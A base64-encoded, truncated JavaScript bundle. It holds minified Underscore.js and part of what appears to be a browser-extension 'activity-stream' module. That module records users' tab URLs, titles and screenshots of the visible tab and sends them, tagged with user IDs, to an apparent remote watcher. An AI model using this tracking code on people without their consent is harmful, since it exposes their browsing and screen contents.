ZigxPj1yKXRocm93IG5ldyBFcnJvcigiYmluZEFsbCBtdXN0IGJlIHBhc3NlZCBmdW5jdGlvbiBuYW1lcyIpO2Zvcih0PTE7cj50O3QrKyluPWFyZ3VtZW50c1t0XSxlW25dPUwuYmluZChlW25dLGUpO3JldHVybiBlfSxMLm1lbW9pemU9ZnVuY3Rpb24oZSx0KXt2YXIgbj1mdW5jdGlvbihyKXt2YXIgaT1uLmNhY2hlLHM9IiIrKHQ/dC5hcHBseSh0aGlzLGFyZ3VtZW50cyk6cik7cmV0dXJuIEwuaGFzKGkscyl8fChpW3NdPWUuYXBwbHkodGhpcyxhcmd1bWVudHMpKSxpW3NdfTtyZXR1cm4gbi5jYWNoZT17fSxufSxMLmRlbGF5PWZ1bmN0aW9uKGUsdCl7dmFyIG49cC5jYWxsKGFyZ3VtZW50cywyKTtyZXR1cm4gc2V0VGltZW91dChmdW5jdGlvbigpe3JldHVybiBlLmFwcGx5KG51bGwsbil9LHQpfSxMLmRlZmVyPUwucGFydGlhbChMLmRlbGF5LEwsMSksTC50aHJvdHRsZT1mdW5jdGlvbihlLHQsbil7dmFyIHIsaSxzLG89bnVsbCxhPTA7bnx8KG49e30pO3ZhciB1PWZ1bmN0aW9uKCl7YT1uLmxlYWRpbmc9PT0hMT8wOkwubm93KCksbz1udWxsLHM9ZS5hcHBseShyLGkpLG98fChyPWk9bnVsbCl9O3JldHVybiBmdW5jdGlvbigpe3ZhciBjPUwubm93KCk7YXx8bi5sZWFkaW5nIT09ITF8fChhPWMpO3ZhciBsPXQtKGMtYSk7cmV0dXJuIHI9dGhpcyxpPWFyZ3VtZW50cywwPj1sfHxsPnQ/KG8mJihjbGVhclRpbWVvdXQobyksbz1udWxsKSxhPWMscz1lLmFwcGx5KHIsaSksb3x8KHI9aT1udWxsKSk6b3x8bi50cmFpbGluZz09PSExfHwobz1zZXRUaW1lb3V0KHUsbCkpLHN9fSxMLmRlYm91bmNlPWZ1bmN0aW9uKGUsdCxuKXt2YXIgcixpLHMsbyxhLHU9ZnVuY3Rpb24oKXt2YXIgYz1MLm5vdygpLW87dD5jJiZjPj0wP3I9c2V0VGltZW91dCh1LHQtYyk6KHI9bnVsbCxufHwoYT1lLmFwcGx5KHMsaSkscnx8KHM9aT1udWxsKSkpfTtyZXR1cm4gZnVuY3Rpb24oKXtzPXRoaXMsaT1hcmd1bWVudHMsbz1MLm5vdygpO3ZhciBjPW4mJiFyO3JldHVybiByfHwocj1zZXRUaW1lb3V0KHUsdCkpLGMmJihhPWUuYXBwbHkocyxpKSxzPWk9bnVsbCksYX19LEwud3JhcD1mdW5jdGlvbihlLHQpe3JldHVybiBMLnBhcnRpYWwodCxlKX0sTC5uZWdhdGU9ZnVuY3Rpb24oZSl7cmV0dXJuIGZ1bmN0aW9uKCl7cmV0dXJuIWUuYXBwbHkodGhpcyxhcmd1bWVudHMpfX0sTC5jb21wb3NlPWZ1bmN0aW9uKCl7dmFyIGU9YXJndW1lbnRzLHQ9ZS5sZW5ndGgtMTtyZXR1cm4gZnVuY3Rpb24oKXtmb3IodmFyIG49dCxyPWVbdF0uYXBwbHkodGhpcyxhcmd1bWVudHMpO24tLTspcj1lW25dLmNhbGwodGhpcyxyKTtyZXR1cm4gcn19LEwuYWZ0ZXI9ZnVuY3Rpb24oZSx0KXtyZXR1cm4gZnVuY3Rpb24oKXtyZXR1cm4tLWU8MT90LmFwcGx5KHRoaXMsYXJndW1lbnRzKTp2b2lkIDB9fSxMLmJlZm9yZT1mdW5jdGlvbihlLHQpe3ZhciBuO3JldHVybiBmdW5jdGlvbigpe3JldHVybi0tZT4wJiYobj10LmFwcGx5KHRoaXMsYXJndW1lbnRzKSksMT49ZSYmKHQ9bnVsbCksbn19LEwub25jZT1MLnBhcnRpYWwoTC5iZWZvcmUsMik7dmFyIEY9IXt0b1N0cmluZzpudWxsfS5wcm9wZXJ0eUlzRW51bWVyYWJsZSgidG9TdHJpbmciKSxDPVsidmFsdWVPZiIsImlzUHJvdG90eXBlT2YiLCJ0b1N0cmluZyIsInByb3BlcnR5SXNFbnVtZXJhYmxlIiwiaGFzT3duUHJvcGVydHkiLCJ0b0xvY2FsZVN0cmluZyJdO0wua2V5cz1mdW5jdGlvbihlKXtpZighTC5pc09iamVjdChlKSlyZXR1cm5bXTtpZihnKXJldHVybiBnKGUpO3ZhciB0PVtdO2Zvcih2YXIgbiBpbiBlKUwuaGFzKGUsbikmJnQucHVzaChuKTtyZXR1cm4gRiYmYShlLHQpLHR9LEwuYWxsS2V5cz1mdW5jdGlvbihlKXtpZighTC5pc09iamVjdChlKSlyZXR1cm5bXTt2YXIgdD1bXTtmb3IodmFyIG4gaW4gZSl0LnB1c2gobik7cmV0dXJuIEYmJmEoZSx0KSx0fSxMLnZhbHVlcz1mdW5jdGlvbihlKXtmb3IodmFyIHQ9TC5rZXlzKGUpLG49dC5sZW5ndGgscj1BcnJheShuKSxpPTA7bj5pO2krKylyW2ldPWVbdFtpXV07cmV0dXJuIHJ9LEwubWFwT2JqZWN0PWZ1bmN0aW9uKGUsdCxuKXt0PXcodCxuKTtmb3IodmFyIHIsaT1MLmtleXMoZSkscz1pLmxlbmd0aCxvPXt9LGE9MDtzPmE7YSsrKXI9aVthXSxvW3JdPXQoZVtyXSxyLGUpO3JldHVybiBvfSxMLnBhaXJzPWZ1bmN0aW9uKGUpe2Zvcih2YXIgdD1MLmtleXMoZSksbj10Lmxlbmd0aCxyPUFycmF5KG4pLGk9MDtuPmk7aSsrKXJbaV09W3RbaV0sZVt0W2ldXV07cmV0dXJuIHJ9LEwuaW52ZXJ0PWZ1bmN0aW9uKGUpe2Zvcih2YXIgdD17fSxuPUwua2V5cyhlKSxyPTAsaT1uLmxlbmd0aDtpPnI7cisrKXRbZVtuW3JdXV09bltyXTtyZXR1cm4gdH0sTC5mdW5jdGlvbnM9TC5tZXRob2RzPWZ1bmN0aW9uKGUpe3ZhciB0PVtdO2Zvcih2YXIgbiBpbiBlKUwuaXNGdW5jdGlvbihlW25dKSYmdC5wdXNoKG4pO3JldHVybiB0LnNvcnQoKX0sTC5leHRlbmQ9VChMLmFsbEtleXMpLEwuZXh0ZW5kT3duPUwuYXNzaWduPVQoTC5rZXlzKSxMLmZpbmRLZXk9ZnVuY3Rpb24oZSx0LG4pe3Q9dyh0LG4pO2Zvcih2YXIgcixpPUwua2V5cyhlKSxzPTAsbz1pLmxlbmd0aDtvPnM7cysrKWlmKHI9aVtzXSx0KGVbcl0scixlKSlyZXR1cm4gcn0sTC5waWNrPWZ1bmN0aW9uKGUsdCxuKXt2YXIgcixpLHM9e30sbz1lO2lmKG51bGw9PW8pcmV0dXJuIHM7TC5pc0Z1bmN0aW9uKHQpPyhpPUwuYWxsS2V5cyhvKSxyPWsodCxuKSk6KGk9UChhcmd1bWVudHMsITEsITEsMSkscj1mdW5jdGlvbihlLHQsbil7cmV0dXJuIHQgaW4gbn0sbz1PYmplY3QobykpO2Zvcih2YXIgYT0wLHU9aS5sZW5ndGg7dT5hO2ErKyl7dmFyIGM9aVthXSxsPW9bY107cihsLGMsbykmJihzW2NdPWwpfXJldHVybiBzfSxMLm9taXQ9ZnVuY3Rpb24oZSx0LG4pe2lmKEwuaXNGdW5jdGlvbih0KSl0PUwubmVnYXRlKHQpO2Vsc2V7dmFyIHI9TC5tYXAoUChhcmd1bWVudHMsITEsITEsMSksU3RyaW5nKTt0PWZ1bmN0aW9uKGUsdCl7cmV0dXJuIUwuY29udGFpbnMocix0KX19cmV0dXJuIEwucGljayhlLHQsbil9LEwuZGVmYXVsdHM9VChMLmFsbEtleXMsITApLEwuY3JlYXRlPWZ1bmN0aW9uKGUsdCl7dmFyIG49WShlKTtyZXR1cm4gdCYmTC5leHRlbmRPd24obix0KSxufSxMLmNsb25lPWZ1bmN0aW9uKGUpe3JldHVybiBMLmlzT2JqZWN0KGUpP0wuaXNBcnJheShlKT9lLnNsaWNlKCk6TC5leHRlbmQoe30sZSk6ZX0sTC50YXA9ZnVuY3Rpb24oZSx0KXtyZXR1cm4gdChlKSxlfSxMLmlzTWF0Y2g9ZnVuY3Rpb24oZSx0KXt2YXIgbj1MLmtleXModCkscj1uLmxlbmd0aDtpZihudWxsPT1lKXJldHVybiFyO2Zvcih2YXIgaT1PYmplY3QoZSkscz0wO3I+cztzKyspe3ZhciBvPW5bc107aWYodFtvXSE9PWlbb118fCEobyBpbiBpKSlyZXR1cm4hMX1yZXR1cm4hMH07dmFyIEE9ZnVuY3Rpb24oZSx0LG4scil7aWYoZT09PXQpcmV0dXJuIDAhPT1lfHwxL2U9PT0xL3Q7aWYobnVsbD09ZXx8bnVsbD09dClyZXR1cm4gZT09PXQ7ZSBpbnN0YW5jZW9mIEwmJihlPWUuX3dyYXBwZWQpLHQgaW5zdGFuY2VvZiBMJiYodD10Ll93cmFwcGVkKTt2YXIgaT1fLmNhbGwoZSk7aWYoaSE9PV8uY2FsbCh0KSlyZXR1cm4hMTtzd2l0Y2goaSl7Y2FzZSJbb2JqZWN0IFJlZ0V4cF0iOmNhc2UiW29iamVjdCBTdHJpbmddIjpyZXR1cm4iIitlPT0iIit0O2Nhc2UiW29iamVjdCBOdW1iZXJdIjpyZXR1cm4rZSE9PStlPyt0IT09K3Q6MD09PStlPzEvK2U9PT0xL3Q6K2U9PT0rdDtjYXNlIltvYmplY3QgRGF0ZV0iOmNhc2UiW29iamVjdCBCb29sZWFuXSI6cmV0dXJuK2U9PT0rdH12YXIgcz0iW29iamVjdCBBcnJheV0iPT09aTtpZighcyl7aWYoIm9iamVjdCIhPXR5cGVvZiBlfHwib2JqZWN0IiE9dHlwZW9mIHQpcmV0dXJuITE7dmFyIG89ZS5jb25zdHJ1Y3RvcixhPXQuY29uc3RydWN0b3I7aWYobyE9PWEmJiEoTC5pc0Z1bmN0aW9uKG8pJiZvIGluc3RhbmNlb2YgbyYmTC5pc0Z1bmN0aW9uKGEpJiZhIGluc3RhbmNlb2YgYSkmJiJjb25zdHJ1Y3RvciJpbiBlJiYiY29uc3RydWN0b3IiaW4gdClyZXR1cm4hMX1uPW58fFtdLHI9cnx8W107Zm9yKHZhciB1PW4ubGVuZ3RoO3UtLTspaWYoblt1XT09PWUpcmV0dXJuIHJbdV09PT10O2lmKG4ucHVzaChlKSxyLnB1c2godCkscyl7aWYodT1lLmxlbmd0aCx1IT09dC5sZW5ndGgpcmV0dXJuITE7Zm9yKDt1LS07KWlmKCFBKGVbdV0sdFt1XSxuLHIpKXJldHVybiExfWVsc2V7dmFyIGMsbD1MLmtleXMoZSk7aWYodT1sLmxlbmd0aCxMLmtleXModCkubGVuZ3RoIT09dSlyZXR1cm4hMTtmb3IoO3UtLTspaWYoYz1sW3VdLCFMLmhhcyh0LGMpfHwhQShlW2NdLHRbY10sbixyKSlyZXR1cm4hMX1yZXR1cm4gbi5wb3AoKSxyLnBvcCgpLCEwfTtMLmlzRXF1YWw9ZnVuY3Rpb24oZSx0KXtyZXR1cm4gQShlLHQpfSxMLmlzRW1wdHk9ZnVuY3Rpb24oZSl7cmV0dXJuIG51bGw9PWU/ITA6aihlKSYmKEwuaXNBcnJheShlKXx8TC5pc1N0cmluZyhlKXx8TC5pc0FyZ3VtZW50cyhlKSk/MD09PWUubGVuZ3RoOjA9PT1MLmtleXMoZSkubGVuZ3RofSxMLmlzRWxlbWVudD1mdW5jdGlvbihlKXtyZXR1cm4hKCFlfHwxIT09ZS5ub2RlVHlwZSl9LEwuaXNBcnJheT15fHxmdW5jdGlvbihlKXtyZXR1cm4iW29iamVjdCBBcnJheV0iPT09Xy5jYWxsKGUpfSxMLmlzT2JqZWN0PWZ1bmN0aW9uKGUpe3ZhciB0PXR5cGVvZiBlO3JldHVybiJmdW5jdGlvbiI9PT10fHwib2JqZWN0Ij09PXQmJiEhZX0sTC5lYWNoKFsiQXJndW1lbnRzIiwiRnVuY3Rpb24iLCJTdHJpbmciLCJOdW1iZXIiLCJEYXRlIiwiUmVnRXhwIiwiRXJyb3IiXSxmdW5jdGlvbihlKXtMWyJpcyIrZV09ZnVuY3Rpb24odCl7cmV0dXJuIF8uY2FsbCh0KT09PSJbb2JqZWN0ICIrZSsiXSJ9fSksTC5pc0FyZ3VtZW50cyhhcmd1bWVudHMpfHwoTC5pc0FyZ3VtZW50cz1mdW5jdGlvbihlKXtyZXR1cm4gTC5oYXMoZSwiY2FsbGVlIil9KSwiZnVuY3Rpb24iIT10eXBlb2YvLi8mJiJvYmplY3QiIT10eXBlb2YgSW50OEFycmF5JiYoTC5pc0Z1bmN0aW9uPWZ1bmN0aW9uKGUpe3JldHVybiJmdW5jdGlvbiI9PXR5cGVvZiBlfHwhMX0pLEwuaXNGaW5pdGU9ZnVuY3Rpb24oZSl7cmV0dXJuIGlzRmluaXRlKGUpJiYhaXNOYU4ocGFyc2VGbG9hdChlKSl9LEwuaXNOYU49ZnVuY3Rpb24oZSl7cmV0dXJuIEwuaXNOdW1iZXIoZSkmJmUhPT0rZX0sTC5pc0Jvb2xlYW49ZnVuY3Rpb24oZSl7cmV0dXJuIGU9PT0hMHx8ZT09PSExfHwiW29iamVjdCBCb29sZWFuXSI9PT1fLmNhbGwoZSl9LEwuaXNOdWxsPWZ1bmN0aW9uKGUpe3JldHVybiBudWxsPT09ZX0sTC5pc1VuZGVmaW5lZD1mdW5jdGlvbihlKXtyZXR1cm4gdm9pZCAwPT09ZX0sTC5oYXM9ZnVuY3Rpb24oZSx0KXtyZXR1cm4gbnVsbCE9ZSYmbS5jYWxsKGUsdCl9LEwubm9Db25mbGljdD1mdW5jdGlvbigpe3JldHVybiB1Ll89Yyx0aGlzfSxMLmlkZW50aXR5PWZ1bmN0aW9uKGUpe3JldHVybiBlfSxMLmNvbnN0YW50PWZ1bmN0aW9uKGUpe3JldHVybiBmdW5jdGlvbigpe3JldHVybiBlfX0sTC5ub29wPWZ1bmN0aW9uKCl7fSxMLnByb3BlcnR5PUQsTC5wcm9wZXJ0eU9mPWZ1bmN0aW9uKGUpe3JldHVybiBudWxsPT1lP2Z1bmN0aW9uKCl7fTpmdW5jdGlvbih0KXtyZXR1cm4gZVt0XX19LEwubWF0Y2hlcj1MLm1hdGNoZXM9ZnVuY3Rpb24oZSl7cmV0dXJuIGU9TC5leHRlbmRPd24oe30sZSksZnVuY3Rpb24odCl7cmV0dXJuIEwuaXNNYXRjaCh0LGUpfX0sTC50aW1lcz1mdW5jdGlvbihlLHQsbil7dmFyIHI9QXJyYXkoTWF0aC5tYXgoMCxlKSk7dD1rKHQsbiwxKTtmb3IodmFyIGk9MDtlPmk7aSsrKXJbaV09dChpKTtyZXR1cm4gcn0sTC5yYW5kb209ZnVuY3Rpb24oZSx0KXtyZXR1cm4gbnVsbD09dCYmKHQ9ZSxlPTApLGUrTWF0aC5mbG9vcihNYXRoLnJhbmRvbSgpKih0LWUrMSkpfSxMLm5vdz1EYXRlLm5vd3x8ZnVuY3Rpb24oKXtyZXR1cm4obmV3IERhdGUpLmdldFRpbWUoKX07dmFyIE89eyImIjoiJmFtcDsiLCI8IjoiJmx0OyIsIj4iOiImZ3Q7IiwnIic6IiZxdW90OyIsIiciOiImI3gyNzsiLCJgIjoiJiN4NjA7In0sUj1MLmludmVydChPKSxOPWZ1bmN0aW9uKGUpe3ZhciB0PWZ1bmN0aW9uKHQpe3JldHVybiBlW3RdfSxuPSIoPzoiK0wua2V5cyhlKS5qb2luKCJ8IikrIikiLHI9UmVnRXhwKG4pLGk9UmVnRXhwKG4sImciKTtyZXR1cm4gZnVuY3Rpb24oZSl7cmV0dXJuIGU9bnVsbD09ZT8iIjoiIitlLHIudGVzdChlKT9lLnJlcGxhY2UoaSx0KTplfX07TC5lc2NhcGU9TihPKSxMLnVuZXNjYXBlPU4oUiksTC5yZXN1bHQ9ZnVuY3Rpb24oZSx0LG4pe3ZhciByPW51bGw9PWU/dm9pZCAwOmVbdF07cmV0dXJuIHZvaWQgMD09PXImJihyPW4pLEwuaXNGdW5jdGlvbihyKT9yLmNhbGwoZSk6cn07dmFyIEk9MDtMLnVuaXF1ZUlkPWZ1bmN0aW9uKGUpe3ZhciB0PSsrSSsiIjtyZXR1cm4gZT9lK3Q6dH0sTC50ZW1wbGF0ZVNldHRpbmdzPXtldmFsdWF0ZTovPCUoW1xzXFNdKz8pJT4vZyxpbnRlcnBvbGF0ZTovPCU9KFtcc1xTXSs/KSU+L2csZXNjYXBlOi88JS0oW1xzXFNdKz8pJT4vZ307dmFyIFc9LyguKV4vLFU9eyInIjoiJyIsIlxcIjoiXFwiLCJcciI6InIiLCJcbiI6Im4iLCJcdTIwMjgiOiJ1MjAyOCIsIlx1MjAyOSI6InUyMDI5In0sej0vXFx8J3xccnxcbnxcdTIwMjh8XHUyMDI5L2cscT1mdW5jdGlvbihlKXtyZXR1cm4iXFwiK1VbZV19O0wudGVtcGxhdGU9ZnVuY3Rpb24oZSx0LG4peyF0JiZuJiYodD1uKSx0PUwuZGVmYXVsdHMoe30sdCxMLnRlbXBsYXRlU2V0dGluZ3MpO3ZhciByPVJlZ0V4cChbKHQuZXNjYXBlfHxXKS5zb3VyY2UsKHQuaW50ZXJwb2xhdGV8fFcpLnNvdXJjZSwodC5ldmFsdWF0ZXx8Vykuc291cmNlXS5qb2luKCJ8IikrInwkIiwiZyIpLGk9MCxzPSJfX3ArPSciO2UucmVwbGFjZShyLGZ1bmN0aW9uKHQsbixyLG8sYSl7cmV0dXJuIHMrPWUuc2xpY2UoaSxhKS5yZXBsYWNlKHoscSksaT1hK3QubGVuZ3RoLG4/cys9IicrXG4oKF9fdD0oIituKyIpKT09bnVsbD8nJzpfLmVzY2FwZShfX3QpKStcbiciOnI/cys9IicrXG4oKF9fdD0oIityKyIpKT09bnVsbD8nJzpfX3QpK1xuJyI6byYmKHMrPSInO1xuIitvKyJcbl9fcCs9JyIpLHR9KSxzKz0iJztcbiIsdC52YXJpYWJsZXx8KHM9IndpdGgob2JqfHx7fSl7XG4iK3MrIn1cbiIpLHM9InZhciBfX3QsX19wPScnLF9faj1BcnJheS5wcm90b3R5cGUuam9pbixwcmludD1mdW5jdGlvbigpe19fcCs9X19qLmNhbGwoYXJndW1lbnRzLCcnKTt9O1xuIitzKyJyZXR1cm4gX19wO1xuIjt0cnl7dmFyIG89bmV3IEZ1bmN0aW9uKHQudmFyaWFibGV8fCJvYmoiLCJfIixzKX1jYXRjaChhKXt0aHJvdyBhLnNvdXJjZT1zLGF9dmFyIHU9ZnVuY3Rpb24oZSl7cmV0dXJuIG8uY2FsbCh0aGlzLGUsTCl9LGM9dC52YXJpYWJsZXx8Im9iaiI7cmV0dXJuIHUuc291cmNlPSJmdW5jdGlvbigiK2MrIil7XG4iK3MrIn0iLHV9LEwuY2hhaW49ZnVuY3Rpb24oZSl7dmFyIHQ9TChlKTtyZXR1cm4gdC5fY2hhaW49ITAsdH07dmFyIEo9ZnVuY3Rpb24oZSx0KXtyZXR1cm4gZS5fY2hhaW4/TCh0KS5jaGFpbigpOnR9O0wubWl4aW49ZnVuY3Rpb24oZSl7TC5lYWNoKEwuZnVuY3Rpb25zKGUpLGZ1bmN0aW9uKHQpe3ZhciBuPUxbdF09ZVt0XTtMLnByb3RvdHlwZVt0XT1mdW5jdGlvbigpe3ZhciBlPVt0aGlzLl93cmFwcGVkXTtyZXR1cm4gZi5hcHBseShlLGFyZ3VtZW50cyksSih0aGlzLG4uYXBwbHkoTCxlKSl9fSl9LEwubWl4aW4oTCksTC5lYWNoKFsicG9wIiwicHVzaCIsInJldmVyc2UiLCJzaGlmdCIsInNvcnQiLCJzcGxpY2UiLCJ1bnNoaWZ0Il0sZnVuY3Rpb24oZSl7dmFyIHQ9bFtlXTtMLnByb3RvdHlwZVtlXT1mdW5jdGlvbigpe3ZhciBuPXRoaXMuX3dyYXBwZWQ7cmV0dXJuIHQuYXBwbHkobixhcmd1bWVudHMpLCJzaGlmdCIhPT1lJiYic3BsaWNlIiE9PWV8fDAhPT1uLmxlbmd0aHx8ZGVsZXRlIG5bMF0sSih0aGlzLG4pfX0pLEwuZWFjaChbImNvbmNhdCIsImpvaW4iLCJzbGljZSJdLGZ1bmN0aW9uKGUpe3ZhciB0PWxbZV07TC5wcm90b3R5cGVbZV09ZnVuY3Rpb24oKXtyZXR1cm4gSih0aGlzLHQuYXBwbHkodGhpcy5fd3JhcHBlZCxhcmd1bWVudHMpKX19KSxMLnByb3RvdHlwZS52YWx1ZT1mdW5jdGlvbigpe3JldHVybiB0aGlzLl93cmFwcGVkfSxMLnByb3RvdHlwZS52YWx1ZU9mPUwucHJvdG90eXBlLnRvSlNPTj1MLnByb3RvdHlwZS52YWx1ZSxMLnByb3RvdHlwZS50b1N0cmluZz1mdW5jdGlvbigpe3JldHVybiIiK3RoaXMuX3dyYXBwZWR9LHI9W10saT1mdW5jdGlvbigpe3JldHVybiBMfS5hcHBseSh0LHIpLCEodm9pZCAwIT09aSYmKGUuZXhwb3J0cz1pKSl9KS5jYWxsKHRoaXMpfSxmdW5jdGlvbihlLHQsbil7InVzZSBzdHJpY3QiO2Z1bmN0aW9uIHIoZSl7cmV0dXJue2lkOmUuaWQsd2luZG93SWQ6ZS53aW5kb3dJZCx1cmw6ZS51cmwsdGl0bGU6ZS50aXRsZSxpY29uOmUuZmF2SWNvblVybHx8bnVsbCxzdGF0dXM6ZS5zdGF0dXMsYWN0aXZlOmUuYWN0aXZlLGdsb2JhbEFjdGl2ZTplLndpbmRvd0lkPT09VCYmZS5hY3RpdmV9fWZ1bmN0aW9uIGkoZSl7ZS5zZXQoIndoZW4iLE1hdGgucm91bmQoKG5ldyBEYXRlKS5nZXRUaW1lKCkvMWUzKSx7c2lsZW50OiEwfSk7dmFyIHQ9e3doZW46ZS5nZXQoIndoZW4iKSxpbnN0YW5jZV9pZDpnLmluc3RhbmNlX2lkLGlkOmUuaWQsdXJsOmUuZ2V0KCJ1cmwiKSx1c2VyaWRzOnkudXNlcnMuYWN0aXZlVXNlcnMoKS5tYXAoZnVuY3Rpb24oZSl7cmV0dXJuIGUuaWR9KSx0aXRsZTplLmdldCgidGl0bGUiKSxpY29uOmUuZ2V0KCJpY29uIiksYWN0aXZlOmUuZ2V0KCJnbG9iYWxBY3RpdmUiKX07cmV0dXJuIGUuZ2V0KCJhZG1pbiIpJiYoZS5zZXQoImFkbWluIiwhMSksdC5hZG1pbj0hMCksdH1mdW5jdGlvbiBzKCl7dmFyIGU9QTtBPVtdO3ZhciB0PWUucG9wKCk7dCYmdC5pbWFnZS50aGVuKGZ1bmN0aW9uKGUpe2RlbGV0ZSB0LmltYWdlLHQudGh1bWI9ZSxMLnNlbmRfYWN0aXZpdHlfc3RyZWFtKHQpfSxmdW5jdGlvbigpew0KZGVsZXRlIHQuaW1hZ2UsTC5zZW5kX2FjdGl2aXR5X3N0cmVhbSh0KX0pLGUuZm9yRWFjaChmdW5jdGlvbihlKXtkZWxldGUgZS5pbWFnZSxMLnNlbmRfYWN0aXZpdHlfc3RyZWFtKGUpfSl9ZnVuY3Rpb24gbyhlKXtpZihkZWxldGUgUltlLmlkXSwidGFiLWNoYW5nZSI9PT1lLnR5cGUpe3ZhciB0PTA7aWYoXy5mb3JFYWNoKGZ1bmN0aW9uKG4pe24ucHJpb3JLZXkgaW4gZSYmdCsrfSksMD09PXQpcmV0dXJufXkudXNlcnMuYWN0aXZlVXNlcnMoKS5sZW5ndGgmJncuaXNfd2F0Y2hpbmcoKSYmKGUuaW1hZ2U/KEEucHVzaChlKSxPKCkpOkwuc2VuZF9hY3Rpdml0eV9zdHJlYW0oZSkpfWZ1bmN0aW9uIGEoZSx0KXt2YXIgbj1KU09OLnBhcnNlKEpTT04uc3RyaW5naWZ5KHQpKTtyZXR1cm4gdC5pbWFnZSYmKG4uaW1hZ2U9dC5pbWFnZSksXy5mb3JFYWNoKGZ1bmN0aW9uKHQpe3QucHJpb3JLZXkgaW4gZSYmKG5bdC5wcmlvcktleV09ZVt0LnByaW9yS2V5XSksblt0LnByaW9yS2V5XT09PW5bdC5rZXldJiZkZWxldGUgblt0LnByaW9yS2V5XX0pLCJ0YWItb3BlbiI9PT1lLnR5cGUmJihuLnR5cGU9InRhYi1vcGVuIiksbn1mdW5jdGlvbiB1KGUpe2lmKCFlLnVybCl7aWYoIWUudGl0bGUpcmV0dXJuO2UudXJsPSJodHRwczovL2JsYW5rIn12YXIgdD1ILmdldCgiYWN0aXZpdHkiKSxuPUguZ2V0KCJidWZmZXIiKTtpZigidGFiLXN0YXkiIT09ZS50eXBlJiYodCYmSC5pc0FjdGl2ZSgpJiYoZS5pbWFnZT1rLmNhcHR1cmVWaXNpYmxlVGFiKHQucXVhbGl0eSx0Lm1heF93aWR0aCx0Lm1heF9oZWlnaHQpLGUuaW1hZ2VbImNhdGNoIl0oZnVuY3Rpb24oKXt9KSksbiYmay5jYXB0dXJlVmlzaWJsZVRhYihuLnF1YWxpdHksbi5tYXhfd2lkdGgsbi5tYXhfaGVpZ2h0KS50aGVuKGZ1bmN0aW9uKHQpe1MmJlMuc3RvcmUoZS51cmwsdCl9LGZ1bmN0aW9uKGUpe3YuaSgiZmFpbGVkIHRvIGNhcHR1cmUgc2NyZWVuc2hvdCBmb3IgYnVmZmVyOiAiK2UpfSkpLGUuaWQgaW4gUil7dmFyIHI9YShSW2UuaWRdLnBheWxvYWQsZSk7Y2xlYXJUaW1lb3V0KFJbZS5pZF0udGltZXIpLFJbZS5pZF09e3BheWxvYWQ6cix0aW1lcjpzZXRUaW1lb3V0KG8uYmluZChudWxsLHIpLHApfX1lbHNlIFJbZS5pZF09e3BheWxvYWQ6ZSx0aW1lcjpzZXRUaW1lb3V0KG8uYmluZChudWxsLGUpLHApfX1mdW5jdGlvbiBjKCl7cmV0dXJuIHgud2hlcmUoe3dpbmRvd0lkOlQsYWN0aXZlOiEwfSlbMF19ZnVuY3Rpb24gbCgpe3ZhciBlPWMoKTt4LmZpbHRlcihmdW5jdGlvbih0KXtyZXR1cm4gdC5nZXQoImdsb2JhbEFjdGl2ZSIpJiZ0IT09ZX0pLmZvckVhY2goZnVuY3Rpb24oZSl7ZS5zZXQoImdsb2JhbEFjdGl2ZSIsITEpfSksZSYmZS5zZXQoImdsb2JhbEFjdGl2ZSIsITApfWZ1bmN0aW9uIGQoKXtjaHJvbWUud2luZG93cy5nZXRBbGwoZnVuY3Rpb24oZSl7MCE9PWUubGVuZ3RoJiYoY2hyb21lLndpbmRvd3MuZ2V0TGFzdEZvY3VzZWQoZnVuY3Rpb24oZSl7cmV0dXJuIGNocm9tZS5ydW50aW1lLmxhc3RFcnJvcj92b2lkIHYuZSgiZ2V0TGFzdEZvY3VzZWQgZXJyb3I6IixjaHJvbWUucnVudGltZS5sYXN0RXJyb3IpOihUPWUuaWQsdm9pZCBsKCkpfSksY2hyb21lLnRhYnMucXVlcnkoe30sZnVuY3Rpb24oZSl7eC5zZXQoZS5tYXAocikpfSkpfSl9ZnVuY3Rpb24gaChlKXtyZXR1cm4gbmV3IE0oZnVuY3Rpb24odCxuKXt2YXIgaT14LmdldChlKTtyZXR1cm4gaT90KGkpOnZvaWQgY2hyb21lLnRhYnMuZ2V0KGUsZnVuY3Rpb24oaSl7aWYoY2hyb21lLnJ1bnRpbWUubGFzdEVycm9yKXJldHVybiB2LmUoY2hyb21lLnJ1bnRpbWUubGFzdEVycm9yKSxuKCJDb3VsZG4ndCBmaW5kIHRhYjogIitjaHJvbWUucnVudGltZS5sYXN0RXJyb3IubWVzc2FnZSk7eC5hZGQocihpKSx7bWVyZ2U6ITB9KTt2YXIgcz14LmdldChlKTtyZXR1cm4gcz90KHMpOih2LmUoIkNvdWxkbid0IGZpbmQgdGFiOiIsZSksdm9pZCBuKCJDb3VsZG4ndCBmaW5kIHRhYjoiK2UpKX0pfSl9dmFyIGY9NTAwLHA9MTAwLF89W3trZXk6InVybCIscHJpb3JLZXk6InByaW9yVXJsIn0se2tleToidGl0bGUiLHByaW9yS2V5OiJwcmlvclRpdGxlIn0se2tleToiaWNvbiIscHJpb3JLZXk6InByaW9ySWNvbiJ9XSxtPW4oOCkseT1uKDQpLGc9big1KSx2PW4oMykoImFjdGl2aXR5LXN0cmVhbSIpLGI9bigxNSksTT1uKDExKSxMPW4oMTgpLGs9bigxNiksdz1uKDI1KSxUPW51bGwsWT1iLk1vZGVsLmV4dGVuZCh7aWRBdHRyaWJ1dGU6InVybCIsZGVmYXVsdHM6ZnVuY3Rpb24oKXtyZXR1cm57c3RhbXA6KG5ldyBEYXRlKS5nZXRUaW1lKCksdXJsOm51bGwsaW1hZ2U6bnVsbH19LHRvdWNoOmZ1bmN0aW9uKCl7dGhpcy5zZXQoInN0YW1wIiwobmV3IERhdGUpLmdldFRpbWUoKSl9fSksRD1iLkNvbGxlY3Rpb24uZXh0ZW5kKHttb2RlbDpZLGNvbXBhcmF0b3I6InN0YW1wIixzdG9yZTpmdW5jdGlvbihlLHQpe3ZhciBuPXRoaXMuZ2V0KGUpO24/KG4udG91Y2goKSxuLnNldCgiaW1hZ2UiLHQpKTp0aGlzLmFkZCh7dXJsOmUsaW1hZ2U6dH0pLHRoaXMuY2hlY2tTaXplKCksdGhpcy5wZXJzaXN0KCl9LGNoZWNrU2l6ZTpmdW5jdGlvbigpe3ZhciBlPWNocm9tZS5zdG9yYWdlLmxvY2FsLlFVT1RBX0JZVEVTLTEzMTA3Mjtmb3IodGhpcy5zb3J0KCk7SlNPTi5zdHJpbmdpZnkodGhpcykubGVuZ3RoPmU7KXRoaXMuc2hpZnQoKX0scGVyc2lzdDpmdW5jdGlvbigpe2Nocm9tZS5zdG9yYWdlLmxvY2FsLnNldCh7YnVmZmVyOnRoaXMudG9KU09OKCl9KX0sZ2V0QnlVUkw6Zn